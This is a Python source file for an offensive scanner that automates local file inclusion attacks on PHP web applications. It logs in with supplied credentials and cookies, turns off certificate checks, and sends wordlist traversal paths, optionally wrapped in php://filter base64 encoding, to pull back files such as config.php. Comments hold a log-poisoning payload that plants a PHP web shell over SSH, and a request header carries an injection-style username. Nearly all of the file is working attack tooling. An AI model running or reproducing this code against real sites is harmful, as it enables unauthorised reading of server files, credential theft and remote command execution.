#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
ssl._create_default_https_context = ssl._create_unverified_context  
from Package.one_read import Read_File
#php://filter/read=convert.base64-encode/resource=../../config.php
#ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136

path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
class Aggressiv :    
        def __init__(self):            
            self.control()
            if self.args.aggress:
               with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               print("[+] Login url           : ................ | : "+self.args.loginurl)
               if self.args.user:
                  print("[+] username            : ................ | : "+self.args.user)
                  print("[+] Login password      : ................ | : "+self.args.password)
            print("[+] LFI-wordlist        : ................ | : aggressiv.txt")
            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie) 
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl\
            and self.args.aggress :
                self.Login_auth()          
                self.url_request()
                self.Scan_result()
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie\
            and self.args.aggress :
                self.url_request()
                self.Scan_result()             
            else:
                print("[+] Logic command  Error"+'\n'+'='*30)  
                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --Cookie --aggressiv ')  
                print('[+] To use LFI without  login : --Vulnurl  --Cookie --aggressiv ')                  
        def Login_auth(self):
            loginurl = self.args.loginurl
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),]
            url_login = request.open(loginurl) 
            request.select_form(nr = 0)
            if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
            elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
            elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            response   = request.submit()         
            self.info = response.info()
            content    = response.read()  
            self.url = response.geturl()  
        def url_request(self): 
            self.box_list    = []  
            self.link_list = []
            self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl)#).strip(    
            if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
                  os.makedirs('./FileStore/'+self.ip_re.group()+"/")                
            ssl._create_default_https_context = ssl._create_unverified_context 
            num  = 0   
             
            with open('aggressiv .txt','r') as readline :
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
                        URL = self.args.Vulnurl+ phpfillter+LINE
                        
                    else:
                         URL = self.args.Vulnurl+LINE
                                                                                                          
                    self.url =  URL
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)              
                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),
                                 ('username',"admin'#"),
                                 ('password','password')]
                    first_req = request.open(self.args.Vulnurl).read()                                                      
                    self.Get_Oregnal_URL = request.open(self.url).read()  
                    number = str(len(self.Get_Oregnal_URL))
                    try:  
                        filename = LINE.replace('../','').replace('%2f','').replace('....//','').replace('../','').replace('file://','').replace('//','/').replace('\n','')
                        if self.args.base64:
                            fullurl = self.url.replace('\n','').replace('php://filter/read=convert.base64-encode/resource=','')
                        else:    
                            fullurl = self.url.replace('\n','')
                    except IndexError:
                            pass  
                    if self.args.auth  or not self.args.auth  :   
                       if not self.args.auth:
                          pass
                       else:                                                         
                           pythex = str(re.findall('Content-Length:.+',str(self.info)))
                           pythex= pythex.replace("['",'').replace("']",'')
                           if pythex in str(self.info):
                              info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                              rex2 = re.findall(':.+',info) 
                       for _ in range(1):
                             if num ==1 :
                               pass
                             else: 
                                 if num == 0 : 
                                    if self.args.auth : 
                                       print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                                       print("[+] Date                : ................ | "+rex2[0])
                                       print("[+] Server              : ................ | "+rex2[1])
                                       print("[+] Expires             : ................ | "+rex2[2])
                                       print("[+] Cache-Control       : ................ | "+rex2[3])
                                       print("[+] Pragma              : ................ | "+rex2[4])
                                       print("[+] Vary                : ................ | "+rex2[5])
                                       print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                                       print("[+] Connection          : ................ | "+rex2[7])
                                       print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                                    print('='*20+"\n[*] Agressive Mode   "+'\n'+'='*30+'\n')
                                    if self.args.base64:
                                       print('[+] PHP-Filter : ...............| : php://filter/read=convert.base64-encode/resource='+'\n')
                                    print(" "+"-"*149) 
                                    print("|  "+f"{'   File-Name    ':<23}","|"+f"{'    Length    ':<10}"+"|",f"{'  Full-URL   ':<100}","     |")
                                    print(" "+"-"*149)                    
                                    num = 1 
                             print("|  "+f"{  filename     :<23}","| "+f"{    number    :<13}"+"| ",f"{   fullurl   :<100}","    |",end='\n')                                      
                       self.box_list.append(number)
                       self.link_list.append(self.url.replace('\n',' '))
                       self.link_list.append (str(len(self.Get_Oregnal_URL)))
                       
                                                       
        def Scan_result(self) :
                 final_list = []
                 remove_dup_elem = [*set(self.box_list)]
                 it = iter(self.link_list)
                 res_dct = dict(zip(it, it))
                 res_dct  = res_dct
                 for key in res_dct:
                      with open('./Package/.list','a') as listf:
                          listf.write("%s%s" % (key, res_dct[key])+'\n')  
                 with open('./Package/.list','r') as readf:
                      readFile = readf.readlines()
                      for line in readFile :
                          for i in remove_dup_elem:                             
                             if i in line[-6:-1] :
                                if i in  final_list :
                                   pass
                                else:
                                    try:
                                       final_list.remove(i)
                                    except ValueError:
                                      pass  
                                    final_list.append(line)
                                    final_list.append(i)
                 
                 for L in final_list:                    
                      links = str("".join(re.findall(r'(https?://[^\s]+)',L)))                         
                      with open('./Package/.links','a') as writefile:
                               writedata = writefile.write(links+' ')
                 with open('./Package/.links','r') as readfile:
                      readdata = readfile.read()
                      readdata =readdata.split(" ")
                      readdata = str(readdata).replace("''",'').replace(', , ',',').replace('[','').replace(']','')\
                      .replace(',','\n').replace("'",'')                   
                 if  os.path.exists('./Package/.links'):
                     os.remove('./Package/.links')
                     os.remove('./Package/.list')     
                 print('\n'+'='*40+"\n[*] recmmended links "+'\n'+'='*30+'\n')   
                 print(readdata)                                           
        def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
           parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
           parser.add_argument("-F","--filelist"      , action=None                            ,help ="read fron lfi wordlsit ")
           parser.add_argument("-C","--Cookie"        , action=None                            ,help ="Login sesion Cookie")  
           parser.add_argument("-B64","--base64"      , action='store_true'                    ,help ="Login sesion base64")  
           parser.add_argument("-R","--read"          , action=None                            ,help ="Login sesion base64")  
           parser.add_argument("-UF ","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF ","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P  ","--password"    , action=None                            ,help ="use specific Passowrd")   
           parser.add_argument("-LU  ","--loginurl"   , action=None                            ,help ="use specific Passowrd") 
           parser.add_argument("-U  ","--user"        , action=None                            ,help ="use specific username ")
           parser.add_argument("-A","--aggress"       ,action='store_true'                     ,help ="use specific username ")
           self.args = parser.parse_args()     
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help()         
              exit()                   
if __name__=='__main__':
     Aggressiv()                  
                 
